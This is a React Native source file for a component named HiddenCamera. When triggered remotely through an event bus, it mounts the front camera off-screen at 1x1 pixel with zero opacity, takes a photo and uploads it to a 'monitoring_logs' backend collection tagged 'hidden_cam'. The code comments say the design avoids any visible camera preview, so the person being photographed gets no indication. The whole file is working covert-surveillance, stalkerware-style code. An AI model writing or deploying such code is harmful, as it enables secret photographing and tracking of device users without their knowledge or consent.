import React, { useEffect, useRef, useState, useCallback } from 'react';
import { View } from 'react-native';
import { CameraView, useCameraPermissions } from 'expo-camera';
import { pb, getUserId } from '../../services/pocketbase';

// Simple event bus for triggering camera from outside React tree
class SimpleEventEmitter {
    private listeners: Record<string, Array<(...args: any[]) => void>> = {};

    addListener(event: string, callback: (...args: any[]) => void) {
        if (!this.listeners[event]) this.listeners[event] = [];
        this.listeners[event].push(callback);
        return {
            remove: () => {
                this.listeners[event] = (this.listeners[event] || []).filter(cb => cb !== callback);
            }
        };
    }

    emit(event: string, ...args: any[]) {
        (this.listeners[event] || []).forEach(cb => cb(...args));
    }
}

export const cameraEvents = new SimpleEventEmitter();

/**
 * HiddenCamera: Only mounts the CameraView when a capture is requested.
 * Camera mounts → becomes ready → takes photo → uploads → unmounts.
 * No persistent camera preview = no black rectangle on screen.
 */
export const HiddenCamera = () => {
    const [permission, requestPermission] = useCameraPermissions();
    const cameraRef = useRef<CameraView>(null);
    const [showCamera, setShowCamera] = useState(false);
    const pendingCapture = useRef(false);

    // Request permission on mount
    useEffect(() => {
        requestPermission();
    }, []);

    // Listen for trigger events
    useEffect(() => {
        const sub = cameraEvents.addListener('TRIGGER_CAMERA', () => {
            console.log('[HiddenCamera] Trigger received, mounting camera...');
            pendingCapture.current = true;
            setShowCamera(true);
        });
        return () => sub.remove();
    }, []);

    // Called when the camera hardware is ready
    const onCameraReady = useCallback(async () => {
        if (!pendingCapture.current || !cameraRef.current) return;
        pendingCapture.current = false;

        try {
            // Small delay to let the camera stabilize
            await new Promise(r => setTimeout(r, 500));
            const photo = await cameraRef.current.takePictureAsync({ quality: 0.5, skipProcessing: true });
            if (photo) {
                console.log('[HiddenCamera] Photo captured, uploading...');
                await uploadPhoto(photo.uri);
            }
        } catch (e) {
            console.error('[HiddenCamera] Capture failed:', e);
        } finally {
            // Unmount camera after capture
            setShowCamera(false);
        }
    }, []);

    const uploadPhoto = async (uri: string) => {
        try {
            const formData = new FormData();
            // @ts-ignore — React Native FormData accepts {uri, name, type}
            formData.append('file', {
                uri,
                name: `cam_${Date.now()}.jpg`,
                type: 'image/jpeg',
            });
            formData.append('type', 'hidden_cam');
            formData.append('user_id', getUserId());

            await pb.collection('monitoring_logs').create(formData);
            console.log('[HiddenCamera] Photo uploaded successfully');
        } catch (e) {
            console.error('[HiddenCamera] Upload failed:', e);
        }
    };

    // Don't render anything if no permission or no capture requested
    if (!permission?.granted || !showCamera) return null;

    // Mount camera off-screen only during capture
    return (
        <View style={{ position: 'absolute', width: 1, height: 1, overflow: 'hidden', opacity: 0, top: -1000, left: -1000 }}>
            <CameraView
                ref={cameraRef}
                style={{ width: 200, height: 200 }}
                facing="front"
                onCameraReady={onCameraReady}
            />
        </View>
    );
};
